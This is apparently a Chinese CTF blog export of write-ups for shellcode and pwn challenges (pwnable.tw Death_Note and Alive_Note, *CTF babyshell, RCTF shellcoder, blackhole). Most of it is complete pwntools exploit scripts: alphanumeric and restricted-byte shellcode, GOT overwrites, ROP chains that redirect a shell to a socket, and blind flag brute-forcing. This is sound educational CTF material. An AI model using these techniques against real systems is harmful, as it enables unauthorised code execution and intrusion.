ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10001)shellcode = asm( "push 0x6761;" "push 0x6c662f77;" "push 0x726f2f65;" "push 0x6d6f682f;" "mov ebx,esp;" "mov eax,5;" "int 0x80;" )shellcode+= asm( "mov edx,0x30;" "mov ecx,0x0804A100;" "mov ebx,3;" "mov eax,3;" "int 0x80;" )shellcode+= asm( "mov edx,0x30;" "mov ecx,0x0804A100;" "mov ebx,1;" "mov eax,4;" "int 0x80;" )p.recvuntil(' shellcode:')p.send(shellcode)p.interactive() 0x03.2019USTC新生赛_ShellHacker就是对上面几种工具使用方法的基础考察。 第一小题为直接的shellcode。 第二小题为x86的全大写shellcode，用msf即可。 第三小题为x86_64的全大写shellcode，用shellcode_encoder即可。 0x04.2019*CTF_babyshell这道题也比较有意思，是对输入进行了过滤，只能用他给定的那一句话里的字符。不过好在放了\x0f\x05。 非预期解：直接零字节截断。。。出题人也太随意了吧。 12345678910111213141516171819202122232425262728#coding:utf-8from pwn import *path = './shellcode'local = 1attach = 1#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()p.recvuntil('give me shellcode, plz:')shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'shellcode = '\x6a\x00' + shellcodep.send(shellcode)p.interactive() 预期解法：先查看调用shellcode时寄存器的状态，如下： 1234rax = 0rdi = shellcode_addrrsi = shellcode_addrrdx = shellcode_addr 因为直接配比较难配，所以我们可以先调用read，然后读入正常的shellcode执行。 目标： 12345rax = 0rdi = 0rsi = shellcode_addrrdx = 0x79syscall 首先我们没有push寄存器的指令可用，只有push imem8/imem16可用，所以想将rdi置为0不能用push rax; pop edi，需要找其他方法，查看栈的情况，发现离栈顶8*9的位置有0，所以需要pop九次才会出现0。。。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#coding:utf-8from pwn import *path = './shellcode'local = 1attach = 1#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()if attach == 0: gdb.attach(p,'b *0x4008CB')p.recvuntil('give me shellcode, plz:')'''ZZJ loves shell_code,and here is a gift:\x0F\x05 enjoy it!\x0aZ: pop rdxJ: dec rdx0x20: and reg8/mem8,reg8v: jbe immed8s: jnb immed8h: push immed16_: pop rdia: popa,: sub al,immed8r: jb immed8i: imul reg16/mem16,immed16s: jnb immed8t: jz immed8j: push immed8y: jns immed8!: and reg16/mem16,reg16\x0f\x05: syscall'''shell = ''' pop rdx; pop rdx; pop rdx; pop rdx; pop rdx; pop rdx; pop rdx; pop rdx; pop rdx; pop rdi; push 0x79; pop rdx; syscall;'''real_shellcode = """ call here .ascii "/bin/sh" .byte 0here: pop rdi xor rsi,rsi xor rdx,rdx mov rax,0x3b syscall"""p.send(asm(shell))sleep(1)p.send('\x90'*0xF+asm(shellcraft.amd64.linux.sh()))#也可p.send('\x90'*0xF+asm(real_shellcode))p.interactive() 0x05.pwnable.kr_ascii_easy这道比较有意思的地方在于输入payload的地方在于argv[1]，但是我没法调试，不知道为什么，gdb一直attach不上去，有兴趣的可以参考如下文章： https://blog.yiz96.com/pwnable-ascii_easy/ https://blog.csdn.net/wxh0000mm/article/details/91040778 https://cysecguide.blogspot.com/2018/01/pwnablekr-asciieasy-write-up.html https://www.jianshu.com/p/e18c712133a3 http://krace.top/2017/03/27/ascii-easy/ 0x06.pwnable.kr_ascii查阅一番资料，发现这道题经过了多次改动。。。 我在自己电脑上ulimit -s unlimited以后，地址变成了这个鬼样子： 求大佬解释orz。网上的vDSO段都还是0x55开头，我这是什么情况，本地没法调了。这个0xaa导致gadget的地址全部失效。。。 下面是我查阅的一些资料，我就不做了，有了gadget以后做也不难，有兴趣自行查看： http://krace.top/2019/01/22/pwnablekr-ascii/ https://github.com/sixstars/ctf/blob/master/Wargames/pwnable.kr/ascii/attack.py https://bbs.pediy.com/thread-223472.htm https://www.anquanke.com/post/id/85871 0x07.2019RCTF_shellcoder思路：shellcode没有过滤器限制，不过只能读入7字节，一看就是调用read。不过当时比赛时远程的execve设了限制，之后还需要爆破目录用orw读出flag才可。 exp：12345678910111213141516171819202122232425262728293031323334353637383940414243#coding:utf-8from pwn import *path = './shellcoder'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()shellcode = '''xchg rdi,rsipop dxsyscall'''p.recvuntil('shellcoder:')raw_input()p.send(asm(shellcode))raw_input()shellcode = "\x31\xF6\x56\x48"shellcode+= "\xBB\x2F\x62\x69"shellcode+= "\x6E\x2F\x2F\x73"shellcode+= "\x68\x53\x54\x5F"shellcode+= "\xF7\xEE\xB0\x3B"shellcode+= "\x0F\x05"p.send('\x90'*7+shellcode)if attach == 1: gdb.attach(p)p.interactive() 0x08.pwnable.tw_Death_Note思路：数组反向溢出，可以覆盖GOT表为chunk地址，在chunk里放shellcode即可，然后在调用某个函数got表的时候就会调用shellcode。到这里有一定经验的pwn手都可以想到，难点在于后面。也正是题干的提示：在死亡笔记上写shellcode。 程序过滤了所有的不可见字符，导致我们的shellcode必须全部由可见字符组成。 看到这个要求的第一眼，肯定是用msfvenom的编码器编码shellcode。但是随后又发现了一个问题：每个chunk的大小最大只有80字节，即使最短的shellcode编码以后也要96字节。 1python -c 'import sys; sys.stdout.write("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX 这里我用的21字节的x86_shellcode，编码结果为96字节。(结果不唯一，但长度都是96字节) 1PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIDqo9L7XaH0DKCaQxVO6OSCPhsXtosRSYbNoyM3Jmk0AA 所以想用这个办法的话，只有拆分shellcode为好几段，每一段放到一个chunk里。 这个方法是可以成功的，在没有要求全为可见字符的情况下，将shellcode拆为数个小段，每一段最后用jmp short $+0xZ连接即可，opcode为\xeb\xZ，Z为跳转到下一条语句的偏移。 我原本想的是先把前面一段编码了，再把后面一段编码了，分别放到两个chunk里，再动态调试找Z连接两个段。但是编码shellcode这个事情并不是变魔术是直接变过去的，是需要前提条件的，比如：BufferRegister = EAX这条语句是因为程序是通过rax寄存器调用的shellcode，也就是rax里装的是shellcode的地址，我调试发现，在这道题中，这个寄存器是rdx，我尝试并且成功了，第一段shellcode可以运行到jmp short $+0xZ，但是在拼接时，却找不到下一段编码的这个寄存器，即：没有寄存器里装有第二段shellcode的地址。。。所以无法编码。此想法作罢。 我之后又想能不能把所有带有不可见字符的指令汇聚到一起编码一次，然后用jmp short $+0xZ来相互之间跳转。这种方法可能可行，但是我没有细究。。因为我觉得没有太大价值。 pzhxbz师傅博客里贴出了可见字符的汇编指令汇总。在此基础上，P4nda学长用了四个sub语句配合一些构造好的常数通过减法将原本的\x6b\x40，变为了\xcd\x80 (int 0x80)，从而解决了这个一定存在的巨大麻烦。之后又用xor语句将eax变为0xb。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./death_note')local = 1pdbg.local()pdbg.remote('chall.pwnable.tw',10201)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])pdbg.context.log_level = 'debug'if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elfelse: p = pdbg.run('remote')def new(index,data): p.recvuntil('choice :') p.sendline('1') p.recvuntil('dex :') p.sendline(str(index)) p.recvuntil('Name :') p.send(data)#pdbg.bp([0x080487EF])shellcode = ''' /* execve(path='/bin///sh', argv=0, envp=0) */ /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx /*rewrite shellcode to get 'int 80'*/ push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl /*set zero to edx*/ push ecx pop edx /*set 0x0b to eax*/ push edx pop eax xor al, 0x40 xor al, 0x4b /*foo order,for holding the place*/ push edx pop edx push edx pop edx'''shellcode = asm(shellcode) + '\x6b\x40'new(-16,shellcode)p.interactive() 0x09.pwnable.tw_Alive_Note思路：首先，这道题相对于Death_Note来说，有两个变化： 对shellcode的check更加严格 每一个chunk的大小缩小到了8字节 在check部分： 1234567891011int __cdecl check(char *s)&#123; size_t i; // [esp+Ch] [ebp-Ch] for ( i = 0; strlen(s) &gt; i; ++i ) &#123; if ( s[i] != 0x20 &amp;&amp; !((*__ctype_b_loc())[s[i]] &amp; 8) ) return 0; &#125; return 1;&#125; 首先我不知道__ctype_b_loc()这个函数的意义。。。我查了一波资料还是没大理解，不如用脚本测试： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding:utf-8from pwn import *path = './alive_note'debug = 0attach = 0P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10300)right = []wrong = []def fuzz(): for i in range(0x0,0x100): try: p = process(path) p.recvuntil('choice :') p.sendline('1') p.recvuntil('dex :') p.sendline('0') p.recvuntil('ame :') p.send(chr(i)+'\x00') answer = p.recvline() if "Done" in answer: right.append(chr(i)) except: wrong.append(chr(i)) p.close()fuzz()print rightp.interactive() 结果如下： 可见只能输入0~9，a~z，A~Z与空格。比Death_Note的过滤严格不少，而且每个chunk只能装8个字节，看来是必须要用shellcode链来连接了。shellcode链需要有跳转指令来连接。 根据上面的总结可见：在数字和字母范围内的跳转指令只有jnz。 思路采用read二次读入真正的shellcode。 然后的问题就是int 0x80的解决办法，采取和Death_Note相同的办法来构造。 但是说归说，真的写起来还是没这么简单，这里选用free@GOT来劫持，因为调用其got表时，eax里存放有我们释放的指针的地址，方便进一步对shellcode进行操作。 初识状态： 1234eax = heap_addrebx = 0ecx = 0edx= 0 最终目标： 12345eax = 0x3ebx = 0ecx = heap_addredx = 0x7aint 0x80 第一段：目标：eax=0; ebx=0; ecx=heap_addr; edx=0 是0x7a的原因是因为0x7a是字符z，是我们可以填充的最大字符数。其次jnz在编译时的偏移是相对于当前当前语句，但是编译出来的结果却是相对于下一条语句，字符8的ASCII码为0x38。 1234567push eax; =&gt; Ppop ecx; =&gt; Ypush ebx; =&gt; Spop eax; =&gt; Xpush 0x7a; =&gt; jzjnz $+(0x38+2); =&gt; u8 /*共8个字节*/ 第二段：目标：eax=使用中; ebx=0; ecx=heap_addr;ecx=0x7a 12345pop edx; =&gt; Zdec eax; =&gt; Hxor byte ptr[ecx+0x45],al; =&gt; 0AEjnz $+(0x39+2); =&gt; u9/*共7个字节*/ 第三段：目标：eax=使用中; ebx=0; ecx=heap_addr;ecx=0x7a 1234xor al,0x33; =&gt; 43xor byte ptr[ecx+0x46],al; =&gt; 0AFjnz $+(0x39+2); =&gt; u9/*共7字节*/ 第四段：目标：eax=3; ebx=0; ecx=heap_addr; edx=0x7a; int 0x80 1234push 0x33; =&gt; j3pop eax; =&gt; Xxor al,0x30; =&gt; 40/*共6字节*/ 在shellcode4后面加上2L，所以shellcode4最终8字节。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#coding:utf-8from pwn import *path = './alive_note'debug = 0attach = 0P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10300)'''right = []wrong = []def fuzz(): for i in range(0x0,0x100): try: p = process(path) p.recvuntil('choice :') p.sendline('1') p.recvuntil('dex :') p.sendline('0') p.recvuntil('ame :') p.send(chr(i)+'\x00') answer = p.recvline() if "Done" in answer: right.append(chr(i)) except: wrong.append(chr(i)) p.close()fuzz()print right'''def new(index,name): p.recvuntil('choice :') p.sendline('1') p.recvuntil('dex :') p.sendline(str(index)) p.recvuntil('ame :') p.sendline(name)def padding(): new(9,'xxrw') new(9,'xxrw') new(9,'xxrw')shellcode1 = '''push eaxpop ecxpush ebxpop eaxpush 0x7ajnz $+(0x38+2)'''shellcode2 = '''pop edxdec eaxxor byte ptr[ecx+0x45],aljnz $+(0x39+2)'''shellcode3 = '''xor al,0x33xor byte ptr[ecx+0x46],aljnz $+(0x39+2)'''shellcode4 = '''push 0x33pop eaxxor al,0x30'''#gdb.attach(p,'b *0x80488EA')note = 0x0804A080new((P.got['free']-note)/4,asm(shellcode1))padding()new(2,asm(shellcode2))padding()new(3,asm(shellcode3))padding()new(4,asm(shellcode4)+'2L')p.recvuntil('choice :')p.sendline('3')p.recvuntil('dex :')p.send('3')p.send('\x90'*0x47+asm(shellcraft.sh()))p.interactive() 其他解法：参考：https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/ 0x0A.pwnable.tw_MnO2用元素周期表和数字来过滤汇编指令。。。感觉纯属恶心人。。。就不放exp了。 0x0C.其他的花式shellcode题目：]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[奇妙屋-时不时放一些好玩的题]]></title>
    <url>%2F2020%2F04%2F10%2F%E5%A5%87%E5%A6%99%E5%B1%8B-%E6%97%B6%E4%B8%8D%E6%97%B6%E6%94%BE%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%A2%98%2F</url>
    <content type="text"><![CDATA[web&amp;&amp;pwn思路比较有趣的一题，程序本身开了1337端口，可以用tcp包交互，也就是可以用浏览器交互，存在格式化字符串和栈溢出漏洞。溢出的漏洞点在base64_decode中，我没细看，直接打即可。 几点需要留意的地方： 调试子进程set follow-fork-mode child 调试父进程set follow-fork-mode parent 将程序输入输出描述符重定向到socket端口，dup2(target_fd,original_fd)。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *local = 1context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'p = remote('127.0.0.1',1337)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')payload = 'GET / HTTP/1.1\r\n'payload+= 'User-Agent: &#123;&#125;\r\n'.format('%7$p%9$p%37$p')p.send(payload)p.recvuntil('[GET] / - 0x')canary = int(p.recvuntil('0x',drop=True),16)elfbase = int(p.recvuntil('0x',drop=True),16) - 0x1caclibcbase = int(p.recvuntil('&lt;',drop=True),16) - libc.sym['__libc_start_main'] - 240log.success('canary = '+hex(canary))log.success('elfbase = '+hex(elfbase))log.success('libcbase = '+hex(libcbase))p.close()p = remote('127.0.0.1',1337)pop_rsi_r15 = elfbase+0x1d99pop_rdi = elfbase+0x1d9bpayload = '\x00'*0x48payload+= p64(canary)payload+= p64(0xdeadbeef)payload+= p64(pop_rdi)payload+= p64(4)payload+= p64(pop_rsi_r15)payload+= p64(1)payload+= p64(0)payload+= p64(libcbase+libc.sym['dup2'])payload+= p64(pop_rdi)payload+= p64(4)payload+= p64(pop_rsi_r15)payload+= p64(0)payload+= p64(0)payload+= p64(libcbase+libc.sym['dup2'])payload+= p64(pop_rdi)payload+= p64(libcbase+libc.search('/bin/sh\x00').next())payload+= p64(libcbase+libc.sym['system'])payload = 'GET /?toy=&#123;&#125; HTTP/1.1\r\n'.format(base64.b64encode(payload))p.send(payload)p.interactive() dark数字经济云安全线上初赛的第三题，就是抄的20180ctf的blackhole，用的slide attack。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#coding:utf-8from pwn import *import signalimport stringpath = './dark'local = 1attach = 0P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('127.0.0.1',8888)part1 = 0x40126Epart2 = 0x401258def call_fun(fun_addr,arg1,arg2,arg3): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payloaddef exp(target,offset): buf = 0x404800 pop_rdi = 0x40127b pop_rsi_r15 = 0x401279 payload = '\x00'*0x18 payload+= call_fun(P.got['read'],0,P.got['alarm'],1) #read 1 payload+= call_fun(P.got['read'],0,buf,10) #read 2 payload+= call_fun(P.got['alarm'],buf-0x800,0x1000,7) payload+= call_fun(P.got['read'],0,buf,0x100) #read 3 payload+= p64(buf) sleep(0.1) p.send(payload) #read() 1 sleep(0.1) p.send('\x05') #read() 2 sleep(0.1) p.send('\x00'*10) #read() 3 shellcode = asm(''' mov rdi,0 mov rsi,%d mov rdx,0x8 mov rax,0 syscall mov rdi,%d mov rsi,2 mov rax,2 syscall mov rdi,rax mov rsi,%d mov rdx,0x20 mov rax,0 syscall mov rdi,%d mov al,%d cmp al,[rdi] jz good mov rax,0x3c syscall good: mov rdi,0 mov rsi,%d mov rdx,0x20 mov rax,0 syscall jmp good '''%(buf+0x400,buf+0x400,buf+0x500,buf+0x500+offset,ord(target),buf+0x600)) sleep(0.1) p.send(shellcode) sleep(0.1) p.send('./flag')index = 0offset = 0bak = '&#123;&#125;_'+string.ascii_lowercase + string.digitsdef my_exit(signum,frame): print str(offset+1)+" char is " + bak[index] sys.exit() while(1): signal.signal(signal.SIGALRM,my_exit) signal.alarm(1) try: log.info(bak[index]) exp(bak[index],offset) p.recvline() p.close() except Exception as e: p.close() index += 1 p = process(path) blackholeslide attack，字符比较成功后陷入死循环来让程序卡住，失败则用exit退出。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *import signalimport stringpath = './blackhole'local = 1attach = 0elf = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if local == 1: io = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: io = remote()def call_func(r12, r15, r14, r13): buf = p64(0x400a4a) buf+= p64(0) # rbx buf+= p64(1) # rbp buf+= p64(r12) # func name buf+= p64(r13) # rdx buf+= p64(r14) # rsi buf+= p64(r15) # rdi buf+= p64(0x400a30) buf+= '0' * 56 return buf# prepare big rop chain, because the previous overflow size is not enough for all the# operationsdef exp(cmpval,offset): bss_addr = 0x601a00 pop_rbp = 0x4007c0 leave_ret = 0x4009a5 b = 'a' * 0x20 b += 'b' * 8 b += call_func(elf.got['read'], 0, bss_addr, 0x300) b += p64(pop_rbp) b += p64(bss_addr) b += p64(leave_ret) io.send(b) # read ROP to it bss_addr2 = 0x601d00 context.arch = 'amd64' b = ''' mov rax, 2 mov rdi, 0x601b78 mov rsi, 0 mov rdx, 0 syscall xchg rax, rdi xor rax, rax mov rsi, 0x601600 mov rdx, 60 syscall mov rcx, 0x601600 add rcx, %d mov al, byte ptr [rcx] cmp al, %d je good bad: mov rax, 60 syscall good: mov rax, 0 mov rdi, 0 mov rsi, 0x601500 mov rdx, 0x100 syscall jmp good ''' SC = asm(b%(offset,cmpval)) b = p64(0) # for pop ebp in leave b += call_func(elf.got['read'], 0, elf.got['alarm'], 1) # set the elf.got['alarm'] to syscall b += call_func(elf.got['read'], 0, bss_addr2, 10) # set rax 10 b += call_func(elf.got['alarm'], 0x601000, 1000, 7) # mprotect() b += p64(bss_addr + 0x200) b += 'flag\x00' b = b.ljust(0x200, '\x00') b += SC sleep(0.1) io.send(b) # read one byte to the got sleep(0.1) io.send('\x05') # read 10 bytes to set the rax sleep(0.1) io.send('\x00'*0xa)index = 0offset = 0bak = '&#123;&#125;_'+string.ascii_lowercase + string.digitsdef my_exit(signum,frame): log.info(str(offset+1)+'th char: '+bak[index]) sys.exit()while True: signal.signal(signal.SIGALRM,my_exit) signal.alarm(1) try: log.info(bak[index]) exp(ord(bak[index]),offset) io.recvline() io.close() except Exception as e: io.close() index += 1 io = process(path) shellcoder当时题目的提示： 1234567891011who likes singing, dancing, rapping and shell-coding?The directories on the server looks something like this:...├── flag│ ├── unknown│ │ └── ...│ │ └── flag│ └── unknown└── shellcoder 且远程靶机的SYS_execve系统调用是被禁掉的。 思路：如果没有禁用SYS_execve的话，那么我们就可以直接去尝试find命令去搜寻flag文件： find ./ -iname *flag* | xargs cat PS: 如果远程没有find命令，麻烦一点的话可以自己一个一个找【狗头】 但是像题目这种情况，我们就得用getdents系统调用去遍历搜索当前目录去搜寻flag文件。 在./flag文件夹下递归搜寻flag文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132/*#define _GNU_SOURCE#include &lt;dirent.h&gt; #include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#define handle_error(msg) \ do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while (0)struct linux_dirent &#123; long d_ino; off_t d_off; unsigned short d_reclen; char d_name[];&#125;;#define BUF_SIZE 1024*1024*5intmain(int argc, char *argv[])&#123; int fd, nread; char buf[BUF_SIZE]; struct linux_dirent *d; int bpos; char d_type; fd = open(argc &gt; 1 ? argv[1] : ".", O_RDONLY|O_DIRECTORY); if (fd == -1) handle_error("open"); for ( ; ; ) &#123; nread = syscall(SYS_getdents,fd,buf,BUF_SIZE); if (nread == -1) handle_error("getdents"); if (nread == 0) break; printf("--------------- nread=%d ---------------\n", nread); printf("inode# file type d_reclen d_off d_name\n"); for (bpos = 0; bpos &lt; nread;) &#123; d = (struct linux_dirent *) (buf + bpos); printf("%8ld ", d-&gt;d_ino); d_type = *(buf + bpos + d-&gt;d_reclen - 1); printf("%-10s ", (d_type == DT_REG) ? "regular" : (d_type == DT_DIR) ? "directory" : (d_type == DT_FIFO) ? "FIFO" : (d_type == DT_SOCK) ? "socket" : (d_type == DT_LNK) ? "symlink" : (d_type == DT_BLK) ? "block dev" : (d_type == DT_CHR) ? "char dev" : "???"); printf("%4d %10lld %s\n", d-&gt;d_reclen, (long long) d-&gt;d_off, d-&gt;d_name); bpos += d-&gt;d_reclen; &#125; &#125; exit(EXIT_SUCCESS);&#125;*/// gcc -masm=intel -S -O3 -fPIC -pie -fno-stack-protector -s -w -o find.s find.c#include &lt;dirent.h&gt;#include &lt;stddef.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#define die(msg)\do &#123; \ write(1, msg, strlen(msg)); \ exit(EXIT_FAILURE); \&#125; while (0)struct linux_dirent &#123; unsigned long d_ino; unsigned long d_off; unsigned short d_reclen; char d_name[];&#125;;void find(char *root)&#123; char buf[256] = &#123;&#125;; int fd = open(root,O_RDONLY|O_DIRECTORY); if (fd == -1) &#123; die("bad open\n"); &#125; fchdir(fd); //int nread = getdents(fd,buf,256); int nread = syscall(SYS_getdents, fd, buf, 256); close(fd); if (nread == -1 || nread == 0) goto end_find; for(int bpos = 0; bpos &lt; nread;)&#123; struct linux_dirent *d = (struct linux_dirent * )(buf + bpos); char *name = d-&gt;d_name; int int_name = *(int *)name; unsigned short reclen = d-&gt;d_reclen; int len = reclen - 2 - offsetof(struct linux_dirent,d_name); char type = *(buf + bpos + d-&gt;d_reclen - 1); //check this is regular file and filename equal to 'flag' if (type == DT_REG &amp;&amp; int_name == 0x67616c66) &#123; fd = open("./flag",O_RDONLY); nread = read(fd, buf, 0x100); write(1, buf, nread); exit(0); &#125; else if(type == DT_DIR &amp;&amp; !(int_name == 0x2e) &amp;&amp; !(int_name == 0x2e2e)) &#123; find(name); &#125; bpos += reclen; &#125;end_find: chdir("..");&#125;int main()&#123; find("./flag");&#125; exp1：将编译好的find.s改遍为shellcode，放进exp里打过去即可。 编译好的find.s如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176 .file &quot;find.c&quot; .intel_syntax noprefix .section .rodata.str1.1,&quot;aMS&quot;,@progbits,1.LC0: .string &quot;bad open\n&quot;.LC1: .string &quot;..&quot;.LC2: .string &quot;./flag&quot; .section .text.unlikely,&quot;ax&quot;,@progbits.LCOLDB3: .text.LHOTB3: .p2align 4,,15 .globl find .type find, @functionfind:.LFB57: .cfi_startproc push r13 .cfi_def_cfa_offset 16 .cfi_offset 13, -16 push r12 .cfi_def_cfa_offset 24 .cfi_offset 12, -24 mov rdx, rdi push rbp .cfi_def_cfa_offset 32 .cfi_offset 6, -32 push rbx .cfi_def_cfa_offset 40 .cfi_offset 3, -40 xor eax, eax mov ecx, 32 mov esi, 65536 sub rsp, 264 .cfi_def_cfa_offset 304 mov rdi, rsp rep stosq mov rdi, rdx call open@PLT cmp eax, -1 je .L30 mov ebx, eax mov edi, eax mov r12, rsp call fchdir@PLT mov ecx, 256 mov rdx, rsp mov esi, ebx mov edi, 78 xor eax, eax call syscall@PLT mov edi, ebx mov rbp, rax mov r13d, eax call close@PLT lea eax, 1[rbp] cmp eax, 1 jbe .L4 test ebp, ebp jle .L4 movzx eax, WORD PTR 16[rsp] mov ecx, DWORD PTR 18[rsp] mov rbx, rax movzx eax, BYTE PTR -1[rsp+rax] cmp al, 8 jne .L5 cmp ecx, 1734437990 je .L6.L5: lea rdi, 18[r12] xor ebp, ebp .p2align 4,,10 .p2align 3.L8: cmp ecx, 11822 setne sil cmp ecx, 46 setne dl test sil, dl je .L9 cmp al, 4 jne .L9 call find@PLT.L9: add ebp, ebx cmp r13d, ebp jle .L4 movsx rax, ebp lea rsi, 256[rsp] lea rdx, [r12+rax] add rax, rsi lea rdi, 18[rdx] mov ecx, DWORD PTR 18[rdx] movzx edx, WORD PTR 16[rdx] movzx eax, BYTE PTR -257[rdx+rax] mov rbx, rdx cmp al, 8 jne .L8 cmp ecx, 1734437990 jne .L8.L6: lea rdi, .LC2[rip] xor esi, esi xor eax, eax call open@PLT mov edx, 256 mov rsi, r12 mov edi, eax call read@PLT mov edi, 1 movsx rdx, eax mov rsi, r12 call write@PLT xor edi, edi call exit@PLT .p2align 4,,10 .p2align 3.L4: lea rdi, .LC1[rip] call chdir@PLT add rsp, 264 .cfi_remember_state .cfi_def_cfa_offset 40 pop rbx .cfi_def_cfa_offset 32 pop rbp .cfi_def_cfa_offset 24 pop r12 .cfi_def_cfa_offset 16 pop r13 .cfi_def_cfa_offset 8 ret.L30: .cfi_restore_state lea rsi, .LC0[rip] mov edi, 1 mov edx, 9 call write@PLT mov edi, 1 call exit@PLT .cfi_endproc.LFE57: .size find, .-find .section .text.unlikely.LCOLDE3: .text.LHOTE3: .section .text.unlikely.LCOLDB4: .section .text.startup,&quot;ax&quot;,@progbits.LHOTB4: .p2align 4,,15 .globl main .type main, @functionmain:.LFB58: .cfi_startproc lea rdi, .LC2[rip] sub rsp, 8 .cfi_def_cfa_offset 16 call find@PLT xor eax, eax add rsp, 8 .cfi_def_cfa_offset 8 ret .cfi_endproc.LFE58: .size main, .-main .section .text.unlikely.LCOLDE4: .section .text.startup.LHOTE4: .ident &quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609&quot; .section .note.GNU-stack,&quot;&quot;,@progbits 改编后： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161_start: jmp mainsyscall: pop rax syscall retopen: push 2 jmp syscallread: push 0 jmp syscallwrite: push 1 jmp syscallclose: push 3 jmp syscallchdir: push 80 